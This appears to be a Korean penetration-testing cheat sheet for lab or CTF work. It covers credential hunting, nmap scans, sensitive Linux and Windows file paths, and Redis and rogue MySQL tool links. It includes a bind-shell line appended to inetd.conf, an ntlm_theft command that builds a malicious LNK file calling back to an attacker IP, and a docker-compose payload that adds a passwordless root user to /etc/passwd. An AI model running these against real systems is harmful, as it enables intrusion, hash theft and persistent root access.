- `config` 파일을 먼저 `find`로 모두 찾아본 뒤에 패스워드 혹은 해시가 적혀 있는지 확인

- password reuse

- `curl` 헤더 확인

- 사이트 제목 및 내용 확인

- `/var/mail`에 있는 내용 확인
- github에서 `"$pass"`로 pass 변수 찾기
---
# windows ssh file location
```powershell
C:\Users\<Username>\.ssh
```
---
# 리버스 셸 연결이 안될 때
- nc/bash/python3 등 리버스 연결이 되지 않는다면 elf 파일 혹은 exe 파일을 만들어서 전달해서 실행시켜보기.
- 리스닝 포트를 well knwon 포트(80,443 등)로 바꿔서 받아보기.

---
# inetd.conf(옛날 리눅스 환경)
```bash
echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf"
```

- 31337번 포트로 바인드 셸 연결

---
# NMAP
```bash
sudo nmap --scrip vuln <ip>
```
- 취약점을 찾기 어려울 때 nmap 실행해서 확인
- /etc/hosts에 등록하고 난 뒤에 nmap 한번 더 실행해주기.

```bash
sudo nmap -Pn <ip>
```
- ping 테스트가 안되더라도 서버가 열려있을 수 있으니 확인
---
# FTP
- `ls -al`로 숨겨진 파일 확인 가능.
- dir 안될 때 `passive` 입력해서 만들어주기.
- 업로드가 가능한지 확인
---
# Interesting File Path
```bash
/etc/passwd
/etc/shadow
/etc/issue
/etc/group
/etc/hostname
~/home/user/.bash_history

/etc/apache2/sites-enabled/000-default.conf
/var/log/apache/access.log
/var/log/apache2/access.log
/var/log/httpd/access_log
/var/log/apache/error.log
/var/log/apache2/error.log
/var/log/httpd/error_log
/var/log/messages
/var/log/cron.log
/var/log/auth.log

/var/www/html/wp-config.php <-- Wordpress
/var/www/configuration.php <-- Joomla
/var/www/html/inc/header.inc.php <-- Dolphin
/var/www/html/sites/default/settings.php <-- Drupal
/var/www/configuration.php <-- Mambo
/var/www/config.php <-- PHP
```
```powershell
C:/Windows/System32/drivers/etc/hosts
C:/Windows/Panther/Unattend/Unattended.xml
C:/Windows/Panther/Unattended.xml
C:/Windows/Panther/Unattend.txt
C:/Unattend.xml
C:/Autounattend.xml
C:/Windows/system32/sysprep

C:/inetpub/wwwroot
C:/inetpub/wwwroot/web.config
C:/inetpub/logs/logfiles
```
---
# Redis modules execute command
<img width="811" height="496" alt="image" src="https://github.com/user-attachments/assets/0426a9b3-32af-41ba-9bdf-e3585a712089" />

- https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
- https://github.com/n0b0dyCN/redis-rogue-server
---
# redis-cli
```bash
redis-cli -h <ip>
```
---
# SSH
- authorized_keys를 변경할 수 있으면 변경
---
# Make ODT File(Libre Office)
- https://github.com/0bfxgh0st/MMG-LO
---
# glassfish important file location
```bash
glassfish4/glassfish/domains/domain1/config/admin-keyfile and
glassfish4/glassfish/domains/domain1/config/local-password
```
---
# dosbox
- GUI 상태에서 정상 작동
---
# Create malicious Windows file
```bash
python3 ntlm_theft.py -g lnk -s <ip> -f vault
```
- https://github.com/Greenwolf/ntlm_theft
---
# Path variables
```powershell
set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;
```
```bash
export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
```
---
# docker
```bash
docker images
```
---
# docker-compose.yaml exploit
```bash
#cat docker-compose.yaml
version: "3.8"

services:
  suidbash:
    image: ubuntu:latest
    container_name: suid_bash_container
    volumes:
      - /etc/passwd:/mnt/passwd:rw
    entrypoint: ["/bin/bash", "-c", "echo 'root2::0:0::/root:/bin/bash' >> /mnt/passwd && tail -f /dev/null"]
    tty: true
```
- root2 유저 추가
---
# Windows 재시작
```powershell
shutdown /r /t 0
```
---
# Rogue Mysql Server
- https://github.com/allyshka/Rogue-MySql-Server
---
# Python SSL requests error
- `verify=False`를 요청에다가 추가해주기
